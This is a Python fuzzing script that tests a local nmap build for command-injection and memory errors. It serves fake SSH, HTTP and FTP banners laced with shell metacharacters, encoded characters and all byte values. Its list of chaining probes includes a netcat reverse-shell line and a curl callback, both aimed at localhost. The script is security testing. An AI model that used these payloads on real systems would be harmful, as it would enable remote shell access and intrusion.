#!/usr/bin/env python3
"""
GHOST SHELL ESCAPE BATTERY — researched command-injection fuzzing methods
applied to nmap's response paths.

Methods applied (from WAHH 2nd ed. + SecLists + Wfuzz bad-chars):
  1. Full shell metacharacter injection (every position: prefix/infix/suffix)
  2. WAHH backslash-prefix logic-flaw: put a backslash BEFORE each metachar
     to break the target's own escaping
  3. Command chaining probes (; id, && id, | id, `id`, $(id))
  4. Wfuzz bad-chars style: every byte 0x00-0xFF in matched banner fields
  5. Encoded metacharacters (URL %3B, Unicode fullwidth, etc.)

Sinks in nmap where banner data could reach command/system contexts:
  - version detection matched strings -> printed (terminal)
  - NSE script outputs
  - the ONLY os.execute sinks (dicom scripts) use local args, so this
    battery primarily hunts logic paths where escaping could break.
"""
import json
import os
import subprocess
import sys
import time

NMAP = "/home/dave/deepseek-harness/default-workspace/nmap_experiment/nmap/nmap"

# SecLists-style metacharacter set (sh + bash + dash)
METAS = [
    b";", b"&&", b"||", b"|", b"&", b"`", b"$( )", b"${ }",
    b"(", b")", b"<", b">", b"<<", b">>", b"\\", b"\"", b"'",
    b"\n", b"\r", b"\x00", b"$", b"!", b"#", b"~", b"*", b"?",
    b"[", b"]", b"{", b"}", b"-",
]
METAS = [m.replace(b" ", b"") for m in METAS]  # fix the $( ) entries
METAS += [b"$()", b"${}"]

# WAHH: backslash BEFORE each metachar (break escaping logic)
BACKSLASH_METAS = [b"\\" + m for m in METAS]

# Command chaining probes
CHAINS = [
    b";id", b"&&id", b"||id", b"|id", b"`id`", b"$(id)",
    b";/bin/sh", b"|/bin/sh", b"\nid\n",
    b";nc -e /bin/sh 127.0.0.1 9999",
    b"|| curl http://127.0.0.1:9999/pwned",
]

# Encoded metacharacters
ENCODED = [
    b"%3Bid",           # URL-encoded ;
    b"%26%26id",        # URL-encoded &&
    b"\xef\xbc\x9b",    # Unicode fullwidth ;
    b"\xef\xbc\x84",    # fullwidth $
    b"\xe2\x80\xb2",    # prime '
    b"\xcc\xa8",        # combining diaeresis (lookalike tricks)
]

def banner_server(port, banner):
    code = f'''
import socket, threading
banner = {banner!r}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", {port})); s.listen(16)
def h(c):
    try:
        c.settimeout(5); c.sendall(banner)
        try: c.recv(2048)
        except Exception: pass
        c.sendall(banner)
    finally:
        try: c.close()
        except Exception: pass
while True:
    conn, _ = s.accept()
    threading.Thread(target=h, args=(conn,), daemon=True).start()
'''
    return subprocess.Popen([sys.executable, "-c", code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_nmap(args, timeout=130):
    env = dict(os.environ, ASAN_OPTIONS="detect_leaks=0:abort_on_error=0")
    try:
        p = subprocess.run([NMAP] + args, capture_output=True, timeout=timeout,
                            env=env, text=True)
        return p.returncode, "ERROR: AddressSanitizer" in (p.stdout + p.stderr), p.stdout + p.stderr
    except subprocess.TimeoutExpired:
        return -1, False, "TIMEOUT"

def main():
    port = 18902
    findings = []
    total = 0
    marks = []  # record what ran

    def attack(name, banner):
        nonlocal total
        total += 1
        proc = banner_server(port, banner)
        time.sleep(0.5)
        rc, asan, out = run_nmap(["-Pn", "-p", str(port), "-sV",
                                  "--version-intensity", "9",
                                  "--host-timeout", "80s", "127.0.0.1"])
        status = "*** ASAN HIT ***" if asan else ("timeout" if rc == -1 else "clean")
        if asan:
            print(f"[{total:2d}] {name:36s} {status}", flush=True)
            findings.append({"name": name, "out": out[-4000:]})
            with open(f"/home/dave/workspace/ghost_platform/shellesc_finding_{name}.log", "w") as f:
                f.write(out)
        else:
            # record even clean runs every 10th for progress
            if total % 10 == 0:
                print(f"[{total:2d}] {name:36s} {status}", flush=True)
        proc.terminate(); proc.wait()

    # 1. Metacharacters at every position in an SSH banner (matched field)
    for i, m in enumerate(METAS):
        attack(f"meta_ssh_{m.decode(errors='replace') or 'nul'}",
               b"SSH-2.0-Host" + m + b"Version\r\n")
    # infix
    for i, m in enumerate(METAS[:12]):
        attack(f"metainfix_{i}",
               b"HTTP/1.1 200 OK\r\nServer: Ap" + m + b"ache/2.4\r\n\r\n")

    # 2. WAHH backslash-prefix (break escaping logic)
    for i, m in enumerate(BACKSLASH_METAS):
        attack(f"bslash_{m.decode(errors='replace') or 'nul'}",
               b"220 FTP " + m + b"version9\r\n")

    # 3. Command chaining probes (banner-end contexts)
    for c in CHAINS:
        attack(f"chain_{c.decode(errors='replace')[:20].strip() or 'nl'}",
               b"HTTP/1.1 200 OK\r\nServer: nginx/1.0" + c + b"\r\n\r\n")

    # 4. Wfuzz bad-chars: full byte spectrum in a matched field
    for hi in range(0, 256, 32):
        chunk = bytes(range(hi, min(hi + 32, 256)))
        attack(f"badchars_{hi:02x}",
               b"220 FTP " + chunk + b"\r\n")

    # 5. Encoded metacharacters
    for i, e in enumerate(ENCODED):
        attack(f"encoded_{i}",
               b"HTTP/1.1 302 Found\r\nLocation: http://h/x" + e + b"y\r\n\r\n")

    print(f"\n[*] SHELL ESCAPE BATTERY DONE: {len(findings)}/{total} findings", flush=True)
    with open("/home/dave/workspace/ghost_platform/shellesc_battery_report.json", "w") as f:
        json.dump({"total": total, "findings": len(findings),
                   "finding_names": [x["name"] for x in findings]}, f, indent=2)

if __name__ == "__main__":
    main()
